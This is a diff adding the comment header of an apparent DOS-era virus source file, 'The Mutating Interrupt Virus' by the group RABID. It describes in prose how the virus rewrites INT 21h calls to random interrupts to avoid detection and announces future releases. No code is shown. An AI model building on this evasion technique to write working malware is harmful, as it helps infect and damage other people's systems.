@@ -1,0 +1,32 @@
+;****************************************************************************
+;* The Mutating Interrupt Virus                         -Soltan Griss-
+;*                                                  [RABID] -=+ Front 242 +=-
+;*
+;*
+;* Well this is my Third Release of many to come. This virus uses the latest
+;* of RABID's new inventions the "MUTATING INTERRUPT", what it does (nothing
+;* to special) is Mutate all int 21h (CD 21) to a random interrupt.
+;* Then before executation it will change it back to INT 21.
+;*
+;* Alot of people are wondering if RABID is Still around. YES. Wea reback and 
+;* Kicking, although right now we have limited members, it soon will change.
+;*
+;*
+;* Many Thanks go out to Data Disruptor, who originally came up with the 
+;* interrupt swapping idea.
+;*
+;*
+;* SOON TO COME: Why use conventional memory when do has left so many holes??
+;*               Find out soon in one of our next RELEASES.
+;*
+;*               A Real Mutating virus with moveable modular segments!!<G>! 
+;*
+;*
+;*
+;* A Word of thanks go out to.
+;*
+;* YAM- Keep up the hard work. Alot of improvement come with time.
+;* Admiral Bailey. Waitinf for the next version of the IVP!
+;*
+;*
+;****************************************************************************
